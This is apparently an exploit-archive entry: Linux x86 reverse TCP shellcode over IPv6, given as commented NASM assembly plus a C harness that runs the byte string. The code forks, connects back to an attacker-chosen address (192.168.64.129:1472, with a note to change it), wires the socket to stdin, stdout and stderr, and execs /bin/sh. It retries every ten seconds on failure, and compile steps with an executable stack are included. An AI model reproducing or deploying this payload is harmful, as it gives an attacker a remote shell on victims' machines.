/*

# Title: linux x86 reverse tcp (ipv6)
# Date: 22-04-2016
# Exploit Author: Roziul Hasan Khan Shifat
# Tested on: kali 2.0 and Ubuntu 14.04 LTS
# Contact: shifath12@gmail.com

*/

/*
section .text
	global _start
_start:

;;socket()
xor ebx,ebx
mul ebx ;null out eax

push byte 6
push byte 0x1
push byte 10

mov ecx,esp

mov al,102 ;socketcall()
mov bl,1 ;socket()
int 0x80

mov esi,eax ;storing socket descriptor (we know return value of any syscall stores in eax)

xor eax,eax

mov al,2
xor ebx,ebx
int 80h


cmp eax,ebx
je connect
ja exit

;------------------

;------------------------

connect:

xor ecx,ecx
;-------------------------------------------------------
;struct sockaddr_in6
xor ebx,ebx

push dword ebx ;sin6_scope_id 4 byte

push dword 0x8140a8c0 ; only change it to Your ipv4 address (current ipv4 192.168.64.129)

push word 0xffff
push dword ebx
push dword ebx
push word bx ;sin6_addr 16 byte (ipv6 address ::ffff:192.168.64.129)

push dword ebx ;sin6_flowinfo=4 byte

push word 0xc005 ;sin6_port 2 byte (port 1472)

push word 10 ;sa_family_t=2 byte

;end of struct sockaddr_in6

mov ecx,esp

;--------------------------------------------

;;connect()

push byte 28 ;sizeof ;struct sockaddr_in6

push ecx

push esi

xor ebx,ebx
xor eax,eax
mov al,102
mov bl,3 ;connect()
mov ecx,esp
int 0x80

xor ebx,ebx

cmp eax,ebx
jne retry ;if it fails to connect ,it will  retry to connect to attacker after 10 seconds

;dup2(sd,0)

xor ecx,ecx
mul ecx

mov ebx,esi
mov al,63
int 80h

;dup2(sd,1)

xor eax,eax
inc ecx

mov ebx,esi
mov al,63
int 80h

;;dup2(sd,2)

xor eax,eax
inc ecx

mov ebx,esi
mov al,63
int 80h

;;execve(/bin//sh)

xor edx,edx
mul edx

push edx ;null terminated /bin//sh
push 0x68732f2f
push 0x6e69622f

mov ebx,esp

push edx
push ebx

mov ecx,esp

mov al,11 ;execve()
int 0x80

ret

;------------------------------------------------------

retry:

xor ebx,ebx

push ebx
push byte 10

mul ebx
mov ebx,esp

mov al,0xa2 ;nanosleep()

int 80h

jmp connect

ret

;----------------------------
exit:
xor eax,eax
mov al,1
int 80h

*/


/*
to compile:

$nasm -f elf filename.s
$ld filename.o
$./a.out

to compile shellcode

$gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$./shellcode

*/


#include<string.h>
#include<stdio.h>
char shellcode[]="\x31\xdb\xf7\xe3\x6a\x06\x6a\x01\x6a\x0a\x89\xe1\xb0\x66\xb3\x01\xcd\x80\x89\xc6\x31\xc0\xb0\x02\x31\xdb\xcd\x80\x39\xd8\x74\x02\x77\x77\x31\xc9\x31\xdb\x53\x68\xc0\xa8\x40\x81\x66\x6a\xff\x53\x53\x66\x53\x53\x66\x68\x05\xc0\x66\x6a\x0a\x89\xe1\x6a\x1c\x51\x56\x31\xdb\x31\xc0\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x31\xdb\x39\xd8\x75\x36\x31\xc9\xf7\xe1\x89\xf3\xb0\x3f\xcd\x80\x31\xc0\x41\x89\xf3\xb0\x3f\xcd\x80\x31\xc0\x41\x89\xf3\xb0\x3f\xcd\x80\x31\xd2\xf7\xe2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\xc3\x31\xdb\x53\x6a\x0a\xf7\xe3\x89\xe3\xb0\xa2\xcd\x80\xeb\x8a\xc3\x31\xc0\xb0\x01\xcd\x80";


int (*exec_shellcode)();
main()
{
printf("Shellcode length: %ld\n",(long)strlen(shellcode));
exec_shellcode=(int(*)())shellcode;
(*exec_shellcode)();

}